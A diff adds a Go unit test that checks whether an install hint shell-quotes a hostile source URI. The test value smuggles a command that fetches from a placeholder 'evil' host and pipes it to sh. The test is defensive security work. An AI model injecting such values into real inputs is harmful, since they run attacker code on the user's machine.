@@ -70,3 +70,19 @@ func TestSourcesValidation(t *testing.T) {
 		t.Fatal(err)
 	}
 }
+
+// A hostile hint must buy an install review, not command injection: the
+// printed remedy shell-quotes hint-controlled fields (and terminal-escapes
+// them, covered by EscapeTerminal's own tests).
+func TestSourcesHintIsShellSafe(t *testing.T) {
+	h := SourceHint{URI: "https://example/x;curl${IFS}evil|sh", From: "project config"}
+	got := h.InstallHint("skill")
+	if !strings.Contains(got, `'https://example/x;curl${IFS}evil|sh'`) {
+		t.Fatalf("metacharacter URI must be single-quoted:\n%s", got)
+	}
+	// Plain URIs stay bare for readability.
+	plain := SourceHint{URI: "https://example.test/x/skill.toml"}
+	if strings.Contains(plain.InstallHint("skill"), "'") {
+		t.Fatal("plain URI must not be quoted")
+	}
+}
